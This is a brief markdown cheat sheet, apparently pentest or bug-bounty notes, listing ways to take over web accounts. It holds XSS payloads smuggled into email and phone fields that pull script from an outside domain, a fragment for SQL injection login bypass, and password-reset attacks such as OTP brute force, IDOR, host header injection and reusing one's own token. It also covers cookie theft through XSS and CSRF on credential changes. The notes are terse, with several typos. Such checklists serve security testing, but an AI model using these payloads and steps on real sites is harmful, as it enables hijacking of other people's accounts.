# Account Takeover

## Email Reset
```
Send reset request of your on Account 
save/intercept the reques
Change mail to victim

```
## SQLI or XSS in forms
```
XSS
Email: "><img/src/onerror=import('//domain/')>"@domain.com
Mobile: 013371337;ext=<img/src/onerror=import('//domain/')>
------
SQLI
login forms no quote user and pass
/1#\
/1#\
```
## Password Reset
```
Check One time Password length--> bruteforce
IDOR in /reset endpoint
Token or One Time Password Leak in response
Host Header Injection in /reset endpoint 
Flawed Token or One Time Password validation
	-use your own reset token for target account
Parameter Pollution
```

## XSS or CSRF to Account Takeover
```
Get session Cookies or Tokens via XSS
CSRF for change email/passord/details
```
